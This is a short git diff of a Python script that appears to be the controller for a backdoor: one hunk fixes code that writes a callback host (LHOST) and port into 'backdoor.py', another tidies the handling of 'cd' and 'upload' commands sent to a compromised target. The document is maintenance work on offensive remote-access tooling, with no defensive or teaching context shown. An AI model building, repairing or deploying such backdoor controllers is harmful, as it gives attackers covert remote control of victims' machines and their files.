@@ -31,7 +31,7 @@ def modify_backdoor():
     file = open('backdoor.py')
     _content = file.readlines()
     for i, line in enumerate(fileinput.input('backdoor.py', inplace=1)):
-        sys.stdout.write(line.replace(_content[15], f'LHOST = "{LHOST}";PORT = {PORT}'))
+        sys.stdout.write(line.replace(_content[16], f'LHOST = "{LHOST}";PORT = {PORT}\n'))
     print(termcolor.colored("[+] Modifying backdoor file", 'green'))
 
 
@@ -94,9 +94,7 @@ def target_reqs():
       elif cmd == 'clear':
          os.system('clear')
       elif cmd[:3] == 'cd ':
-         l = reliable_recv()
-         print(l)
-         pass
+         print(reliable_recv())
       elif cmd[:6] == 'upload':
           try:
               upload_file(cmd[7:])
